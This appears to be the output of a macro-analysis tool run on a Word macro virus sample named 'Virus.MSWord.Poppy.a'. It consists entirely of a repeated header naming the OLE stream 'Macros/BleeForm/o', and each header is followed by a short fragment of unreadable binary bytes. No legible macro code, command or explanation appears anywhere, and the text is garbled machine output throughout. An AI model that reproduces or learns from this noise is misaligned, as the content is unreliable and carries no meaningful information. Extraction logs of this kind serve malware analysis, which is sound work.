VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��-��|���!{������Qd��ӆ9����c�HYcdRܖ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/�%��]�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Q�N�7e�6=
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
U�_�o:�g[%��DWS�]Z�<Ɍ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��\a~��t���ݘ�/v��Wp��ڷ�:�Ѩ,�����{
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
cjr��@�T�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��r���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�/śF꺋<��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��mU���Kwsm�Cr�Q�|mƒ����Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
U7�؎)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
S}��]���jt?`-:R��������i��Q�x���W�G
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
D���klhbFɎ8�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
u5 s�d�엃��o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ڵ.���M�Z��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�꥾Kt�z(����)V
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�U$.XF6�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��o	��ѝ��w
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Y�+Z�i�eT��/��R�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8*b�jF��d	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�F�r����B3�S����޿
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
eO�;l��}]=�}E���GGOD���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.�� DQ_lʻ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���_��>
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���i���o��J�u�����55d�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$�QF&�|��y�2�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*9kU�%�
���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��9AK��\�N����F�G��K� HVw��Dy�E��Bц
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����*�*{�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ʪi��u��Aq��o�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
G�J�U���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8*���W
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���몎��n��<;Z)�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}ÏYkH�o��ּiȴ��Ѕ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H�+U��$l]�3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�w���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Η�4:O���V�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�,���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�h��=M���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*�SS���d�<��G
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
E;�)nM4T��}��fo�i^���Qi;�E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�S۵5�z
�`gtYV9�Y��:�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ݯ�[�]g�{me�=���GL�+V��v}mv�uK@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�� �:���2��7�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���{�!��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ZgG��.���Ti-E��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
WV�g���]�+W
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f4��#�NHdE��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ad;���h�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ݾ솎�&��kJ������\WR�褎��9_Qp[B�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Li+MA
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Yey6��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��´�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����o��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�쿉��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��>�j���.5��n�=
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0��v�z�Un4t�d�E"R� �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�*��d�J���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
߽{��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?i��&���,���G/�#�(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
a`�Ҩy��V���1�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'��\~6w��̖�gغ��e~��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��B}p�V�i����G
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%D����B���F�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
D6�aw��6��Η�dZ�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���,��^
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,��!V��[�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
w`{�[K5�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���p#�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
V����;�\4�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�R6��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���/�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�1i���u�Uq��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7��� ��y>g���m��s�W
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�3}��7|�u�F�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Iۯg�#Yj᩵�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6��ri��K
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%EW��k���wU�����"
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�/�/�#<�?��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�~ث��sA�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��z�)���I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>E|��C�)�#H[
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#"�����~ԩm7�~�\�W�On��d�iZʪ]Uq�ҕ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
S��ӼJC:ɴ��`
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
R��/��ćr�Qh
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=գ�}�]f._��گE��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
E%T�T5
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7�8�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`_ݘ�X��݇~�w��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
]gTt���M������T��J�z��<�*�5h�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
d�pM�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�;�`�`�/�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��9�=��v�y�l]�]as�[��SC|��G�e�:9��㦆
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��V���h�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�M �U⳧YTw���놁�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3�ܨo��R\c�"
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)t�_�L��9�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��었��w?���N�j�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Я��-Wz���Cs
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
VI.1��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��(%�YfA.ȁ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�x��y�yК�TXj�:7���+q�W�ں��=#L�\d��V
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 �K��.�~27���m
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����;��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:]���u� �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#1I\��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I�*��6;����h
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
P׌N�hO
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�#�݋�U_����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n�T�+�&S:H�e�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��2��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
C"J��U!�!�W�ZJxᡙ����ͅ�8R9���l��{u�G��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:ۼ�zl[
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Wj˕�[w�y�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�URNc2
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
S O3ip�8�ќu�o��]��������
m
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�8�����<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
PWyPBɰ:�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��pT@�m�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��M�:�$իOq�d�Ꮦ��%`
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9ǿסj�jJ���h%Db
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c�ԣݟ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s|�kMA
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5%N��Uw��yO�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
m%Md�5>s�B$0�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
